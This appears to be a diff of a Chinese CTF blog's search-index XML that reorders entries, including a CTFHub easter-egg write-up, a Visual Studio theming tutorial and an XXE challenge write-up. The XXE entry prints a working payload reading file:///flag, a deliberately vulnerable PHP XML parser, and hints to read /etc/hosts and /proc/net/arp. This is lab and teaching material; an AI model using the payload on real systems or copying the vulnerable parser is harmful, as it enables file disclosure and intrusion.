@@ -512,56 +512,6 @@ flag get<br />
       </categories>
   </entry>
   <entry>
-    <title>ctfhub-彩蛋</title>
-    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
-    <content><![CDATA[<h2 id="工具-彩蛋"><a class="markdownIt-Anchor" href="#工具-彩蛋"></a> 工具 彩蛋</h2>
-<p>一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页<br />
-抓包后发现不管哪一页 limit 都是 12 但 offset 在变化<br />
-于是<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述" />这样设置参数<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述" />在长度为 1000 到 6、7 千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述" />在最后一行</p>
-<h2 id="首页-彩蛋"><a class="markdownIt-Anchor" href="#首页-彩蛋"></a> 首页 彩蛋</h2>
-<p><a href="https://api.ctfhub.com">api</a>中间框内隐藏着两行字<br />
-ctfhub{c18732f48a96c40d40a06e74b1305706}<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述" /></p>
-<h2 id="题目入口-彩蛋"><a class="markdownIt-Anchor" href="#题目入口-彩蛋"></a> 题目入口 彩蛋</h2>
-<p>在 web-ssrf 中间那一列的某些题传参错误时会出现<br />
-详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post 最后一行介绍</p>
-<h2 id="公众号"><a class="markdownIt-Anchor" href="#公众号"></a> 公众号</h2>
-<p>公众号彩蛋坑的一批！<br />
-首先要先绑定<br />
-然后点彩蛋<br />
-它提示要回复正确的关键词<br />
-我*#@%<br />
-我回复过</p>
-<blockquote>
-<p>彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……</p>
-</blockquote>
-<p>到底没想到竟然是 flag</p>
-<h2 id="投稿提交-彩蛋"><a class="markdownIt-Anchor" href="#投稿提交-彩蛋"></a> 投稿提交 彩蛋</h2>
-<p>只找到了前半部分<br />
-分别在题目提交和 wp 提交页面的最后</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">029</span>e02eb3a1</span><br><span class="line">	e8c49b1132b5</span><br><span class="line">	<span class="number">15</span>b652a5f3a8</span><br><span class="line">	<span class="number">62013</span>&#125;</span><br></pre></td></tr></table></figure>
-<p>最后这个彩蛋剩余部分也没找到<br />
-网上搜了下才明白：感谢 anweilx 的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br />
-第一行是俩页面的最后有<br />
-第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是 base64 然后再转 url 一个是 hex 解码<br />
-第三行是俩页面的图片隐写 丢进 winhex<br />
-第四行有提示<br />
-aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
-<h2 id="其他彩蛋"><a class="markdownIt-Anchor" href="#其他彩蛋"></a> 其他彩蛋</h2>
-<p>剩余皆可在对应页面搜索 egg 即可获得</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Bypass disable_function</title>
     <url>/2022/05/Bypass%20disable_function/</url>
     <content><![CDATA[<h2 id="ld_preload"><a class="markdownIt-Anchor" href="#ld_preload"></a> LD_PRELOAD</h2>
@@ -666,6 +616,56 @@ pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped
       <tags>
         <tag>web</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-彩蛋</title>
+    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
+    <content><![CDATA[<h2 id="工具-彩蛋"><a class="markdownIt-Anchor" href="#工具-彩蛋"></a> 工具 彩蛋</h2>
+<p>一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页<br />
+抓包后发现不管哪一页 limit 都是 12 但 offset 在变化<br />
+于是<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述" />这样设置参数<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述" />在长度为 1000 到 6、7 千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述" />在最后一行</p>
+<h2 id="首页-彩蛋"><a class="markdownIt-Anchor" href="#首页-彩蛋"></a> 首页 彩蛋</h2>
+<p><a href="https://api.ctfhub.com">api</a>中间框内隐藏着两行字<br />
+ctfhub{c18732f48a96c40d40a06e74b1305706}<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述" /></p>
+<h2 id="题目入口-彩蛋"><a class="markdownIt-Anchor" href="#题目入口-彩蛋"></a> 题目入口 彩蛋</h2>
+<p>在 web-ssrf 中间那一列的某些题传参错误时会出现<br />
+详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post 最后一行介绍</p>
+<h2 id="公众号"><a class="markdownIt-Anchor" href="#公众号"></a> 公众号</h2>
+<p>公众号彩蛋坑的一批！<br />
+首先要先绑定<br />
+然后点彩蛋<br />
+它提示要回复正确的关键词<br />
+我*#@%<br />
+我回复过</p>
+<blockquote>
+<p>彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……</p>
+</blockquote>
+<p>到底没想到竟然是 flag</p>
+<h2 id="投稿提交-彩蛋"><a class="markdownIt-Anchor" href="#投稿提交-彩蛋"></a> 投稿提交 彩蛋</h2>
+<p>只找到了前半部分<br />
+分别在题目提交和 wp 提交页面的最后</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">029</span>e02eb3a1</span><br><span class="line">	e8c49b1132b5</span><br><span class="line">	<span class="number">15</span>b652a5f3a8</span><br><span class="line">	<span class="number">62013</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>最后这个彩蛋剩余部分也没找到<br />
+网上搜了下才明白：感谢 anweilx 的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br />
+第一行是俩页面的最后有<br />
+第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是 base64 然后再转 url 一个是 hex 解码<br />
+第三行是俩页面的图片隐写 丢进 winhex<br />
+第四行有提示<br />
+aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
+<h2 id="其他彩蛋"><a class="markdownIt-Anchor" href="#其他彩蛋"></a> 其他彩蛋</h2>
+<p>剩余皆可在对应页面搜索 egg 即可获得</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
       </tags>
   </entry>
   <entry>
@@ -790,69 +790,6 @@ handler 指向 RequestHandler<br />
       </tags>
   </entry>
   <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动" /></p>
-<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
-<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
-<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
-<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
-<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
-<p>新建项目 C#里面最后一项</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动" /></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png" /></p>
-<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
-<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动" /></p>
-<p>这个插件是为后面设置背景图片准备</p>
-<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动" /></p>
-<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动" /></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>visual studio 2022</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xxe</title>
-    <url>/2022/12/XXE/</url>
-    <content><![CDATA[<h2 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h2>
-<p>发现输入的 username 被 alert 了<br />
-查源码</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">onclick = <span class="string">&quot;XMLFunction()&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述" />抓包看 xml 格式<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述" />回来看控制台<br />
-发现 js 的 xml 应用</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>构造 xxe 攻击<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述" />这是 post 包<code>传的时候记得把注释删去</code></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>&lt;!--构造实体--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--输出flag实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述" /><br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述" /></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>有 admin 密码了也没用<br />
-藏内网了，上次比赛 ssrf 题出过</p>
-<ul>
-<li>etc/hosts</li>
-<li>proc/net/arp<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述" /></li>
-</ul>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
     <url>/2024/05/awdwp/</url>
     <content><![CDATA[<p>(未整理完)</p>
@@ -896,6 +833,34 @@ handler 指向 RequestHandler<br />
         <tag>awd</tag>
         <tag>长城杯</tag>
         <tag>铁人三项</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动" /></p>
+<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
+<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
+<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
+<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
+<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
+<p>新建项目 C#里面最后一项</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动" /></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png" /></p>
+<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
+<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动" /></p>
+<p>这个插件是为后面设置背景图片准备</p>
+<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动" /></p>
+<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动" /></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>visual studio 2022</tag>
       </tags>
   </entry>
   <entry>
@@ -1022,6 +987,41 @@ handler 指向 RequestHandler<br />
         <tag>re</tag>
         <tag>crypto</tag>
         <tag>cloudever wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe</title>
+    <url>/2022/12/XXE/</url>
+    <content><![CDATA[<h2 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h2>
+<p>发现输入的 username 被 alert 了<br />
+查源码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">onclick = <span class="string">&quot;XMLFunction()&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述" />抓包看 xml 格式<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述" />回来看控制台<br />
+发现 js 的 xml 应用</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title 